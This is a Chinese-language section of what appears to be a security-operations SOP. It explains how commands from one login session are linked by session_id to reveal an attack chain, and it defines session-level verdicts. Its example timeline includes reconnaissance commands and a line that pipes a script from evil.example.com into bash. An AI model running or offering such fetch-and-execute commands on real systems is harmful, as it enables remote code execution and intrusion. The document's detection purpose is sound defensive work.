# CA-02 · 它的真正价值：把一次登录还原成一条命令链

## 它的真正价值

**这一类在 12 类里不是「研判对象」，是「证据底座」。**

别的类看的是**一个点**：

- 异常登录：有人登进来了
- 可疑命令：他跑了一条可疑命令
- 本地提权：他提权了
- 反弹 Shell：他连出去了

**这一类看的是那条线** —— 用 `session_id` 把同一次登录里的命令串起来：

```text
13:01:02  whoami
13:01:05  id
13:01:09  cat /etc/passwd
13:01:20  sudo -l
13:01:35  curl http://evil.example.com/x.sh | bash
13:01:40  ./find -perm -4000
```

**一条命令看不出来，一串命令就是攻击链。**

### 三类消费方

| 谁 | 怎么用 |
| --- | --- |
| **异常登录类** | 这个人登进来之后到底干了什么（`host_ip + user_name + session_id`） |
| **可疑命令类** | 那一条可疑命令，前后还有哪些命令（语义连贯，SC-09） |
| **本地提权 / 反弹 Shell / WebShell** | 提权之前、连出去之前，他在干什么 |

### 所以「SOP 的结论」是什么意思

**这一类也会给三态，但粒度是「会话」，不是「告警」。**

- `真实威胁`：这个会话里有形成攻击链的可疑命令
- `误报`：纯运维会话（命令都是常规的，可疑数为 0 且没有攻击形态）
- `存疑`：会话里可疑数为 0，但命令本身看不出是不是正常（比如都是自定义脚本）

> ⚠️ **不要因为它「不是告警」就不判。** 它是唯一能看到「完整一串」的视角 ——
> 别的类只能看到点。
